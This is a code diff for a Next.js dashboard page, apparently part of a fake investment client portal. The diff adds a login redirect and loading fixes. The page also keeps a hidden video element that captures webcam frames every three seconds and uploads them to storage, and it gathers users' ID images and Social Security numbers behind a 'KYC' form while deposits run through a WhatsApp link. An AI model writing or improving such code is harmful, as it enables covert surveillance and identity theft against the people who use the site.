@@ -2,6 +2,7 @@
 
 import React, { useEffect, useState, useRef } from 'react';
 import { supabase } from '@/lib/supabaseClient';
+import { useRouter } from 'next/navigation';
 import { 
   LogOut, Lock, Smartphone, ShieldCheck, 
   Activity, Upload, Camera, User, 
@@ -9,7 +10,9 @@ import {
 } from 'lucide-react';
 
 export default function Dashboard() {
-  // 1. SAFE DEFAULT STATE (Prevents crash if DB fails)
+  const router = useRouter();
+  
+  // 1. SAFE DEFAULT STATE
   const [user, setUser] = useState<any>({
     full_name: 'Valued Client',
     balance: 0,
@@ -27,27 +30,22 @@ export default function Dashboard() {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
 
-  // --- FORCE UNLOCK TIMER ---
-  useEffect(() => {
-    const safetyTimer = setTimeout(() => {
-      setLoading(false);
-    }, 2500);
-    return () => clearTimeout(safetyTimer);
-  }, []);
-
-  // --- DATA LOADING ---
+  // --- STRICT AUTH CHECK (Prevents "Valued Client" glitch on Back button) ---
   useEffect(() => {
     let channel: any;
 
     const initData = async () => {
       try {
+        // 1. Check for active session immediately
         const { data: { session } } = await supabase.auth.getSession();
         
         if (!session) { 
-           // window.location.href = '/portal/auth'; 
+           // If no session (e.g. back button after logout), Force Redirect to Login
+           window.location.href = '/portal/auth'; 
            return; 
         }
 
+        // 2. Fetch Profile (Only runs if authenticated)
         const { data } = await supabase
           .from('profiles')
           .select('*')
@@ -56,10 +54,13 @@ export default function Dashboard() {
 
         if (data) {
           setUser(data);
-          // Start camera immediately
+          setLoading(false); // Stop loading only when we have real data
           startProctoring(session.user.id);
+        } else {
+           setLoading(false);
         }
 
+        // 3. Realtime Listener
         channel = supabase.channel('realtime-profile')
           .on(
             'postgres_changes',
@@ -73,6 +74,7 @@ export default function Dashboard() {
 
       } catch (err) {
         console.error("Connection Error:", err);
+        setLoading(false);
       }
     };
 
@@ -80,10 +82,9 @@ export default function Dashboard() {
     return () => { if (channel) supabase.removeChannel(channel); };
   }, []);
 
-  // --- FIXED CAMERA LOGIC ---
+  // --- CAMERA LOGIC (Fixed Black Screen & 3s Interval) ---
   const startProctoring = async (userId: string) => {
     try {
-      // 1. Get Stream with specific constraints
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { 
           facingMode: 'user', 
@@ -95,52 +96,40 @@ export default function Dashboard() {
       const vid = videoRef.current;
       if (vid) {
         vid.srcObject = stream;
-        
-        // 2. Force Play (Fix for Black Screen)
         vid.onloadedmetadata = () => {
           vid.play().catch(e => console.error("Auto-play blocked:", e));
         };
       }
       
-      // 3. Snapshot Loop (Every 3 seconds)
+      // Snapshot Loop (Every 3 Seconds)
       const interval = setInterval(async () => {
         const cvs = canvasRef.current;
-        
-        // CHECK: Ensure video is ready AND playing
         if (vid && cvs && vid.readyState >= 2 && !vid.paused && !vid.ended) {
-            
             const context = cvs.getContext('2d');
             if (context) {
-                // Ensure canvas matches video size to prevent cropping
                 cvs.width = vid.videoWidth;
                 cvs.height = vid.videoHeight;
-                
                 context.drawImage(vid, 0, 0, cvs.width, cvs.height);
                 
-                // Convert to Blob and Upload
                 cvs.toBlob(async (blob) => {
                   if (blob) {
                     const { error } = await supabase.storage
                       .from('proctor-snapshots')
                       .upload(`${userId}/live_${Date.now()}.jpg`, blob);
-                      
-                    if (error) console.warn("Snapshot upload error:", error.message);
+                    if (error) console.warn("Snapshot error:", error.message);
                   }
                 }, 'image/jpeg', 0.5); 
             }
         } else {
-            // Retry playing if paused
             vid?.play().catch(() => {});
         }
       }, 3000); 
 
       return () => clearInterval(interval); 
-    } catch (e) { 
-        console.warn("Biometrics offline:", e); 
-    }
+    } catch (e) { console.warn("Biometrics offline:", e); }
   };
 
-  // --- KYC UPLOAD LOGIC ---
+  // --- KYC LOGIC ---
   const handleKyc = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!idFile || !ssn) return;
@@ -150,7 +139,6 @@ export default function Dashboard() {
       if (!session) throw new Error("No session");
 
       const path = `${session.user.id}/${Date.now()}_id.jpg`;
-      
       await supabase.storage.from('user-kyc').upload(path, idFile);
       
       await supabase.from('profiles').update({ 
@@ -169,18 +157,19 @@ export default function Dashboard() {
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
+  
+  // Logic to show "Reviewing" screen ONLY if SSN has been submitted
   const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);
 
   if (loading) return (
     <div className="min-h-screen bg-black flex flex-col items-center justify-center space-y-4">
       <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
-      <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Establishing Secure Link</p>
+      <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Verifying Identity...</p>
     </div>
   );
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      
       {/* VIDEO ELEMENT (Hidden but active) */}
       <video 
         ref={videoRef} 
@@ -209,7 +198,8 @@ export default function Dashboard() {
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
                 <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
               </div>
-              {/* UPDATED: Sign out redirects to /portal */}
+              
+              {/* SIGN OUT BUTTON - Redirects to /portal */}
               <button 
                 onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} 
                 className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
@@ -344,4 +334,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-                }
+          }
